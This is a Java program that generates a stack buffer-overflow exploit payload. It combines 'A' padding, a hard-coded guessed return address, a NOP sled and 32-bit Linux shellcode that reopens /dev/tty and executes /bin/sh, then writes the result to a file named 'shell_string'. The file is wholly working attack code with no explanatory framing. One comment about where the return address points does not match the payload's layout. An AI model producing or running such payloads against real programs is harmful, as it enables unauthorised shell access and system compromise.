import java.io.FileOutputStream;
import java.io.IOException;

public class GeneratePayload {
    public static void main(String[] args) {
        // Shellcode
        byte[] shellcode = {
                0x31, (byte)0xc0, 0x31, (byte)0xdb, (byte)0xb0, 0x06, (byte)0xcd, (byte)0x80, 0x53, 0x68, 0x2f, 0x74, 0x74, 0x79, 0x68, 0x2f,
                0x64, 0x65, 0x76, (byte)0x89, (byte)0xe3, 0x31, (byte)0xc9, 0x66, (byte)0xb9, 0x12, 0x27, (byte)0xb0, 0x05, (byte)0xcd, (byte)0x80,
                0x31, (byte)0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, (byte)0x89, (byte)0xe3, 0x50, 0x53, (byte)0x89,
                (byte)0xe1, (byte)0x99, (byte)0xb0, 0x0b, (byte)0xcd, (byte)0x80
        };

        // Padding to reach return address
        byte[] padding = new byte[64];
        for (int i = 0; i < padding.length; i++) {
            padding[i] = (byte) 'A';
        }

        // Address to jump to (guessed address)
        // This address should point to the start of the padding in the buffer
        byte[] returnAddress = { (byte)0xd4, (byte)0xd5, (byte)0xff, (byte)0xff };

        // Nops
        byte[] nops = new byte[16];
        for (int i = 0; i < nops.length; i++) {
            nops[i] = (byte)0x90;
        }

        // Construct payload
        byte[] payload = new byte[padding.length + returnAddress.length + nops.length + shellcode.length];
        int index = 0;
        System.arraycopy(padding, 0, payload, index, padding.length);
        index += padding.length;
        System.arraycopy(returnAddress, 0, payload, index, returnAddress.length);
        index += returnAddress.length;
        System.arraycopy(nops, 0, payload, index, nops.length);
        index += nops.length;
        System.arraycopy(shellcode, 0, payload, index, shellcode.length);

        // Write payload to file
        try (FileOutputStream fos = new FileOutputStream("shell_string")) {
            fos.write(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
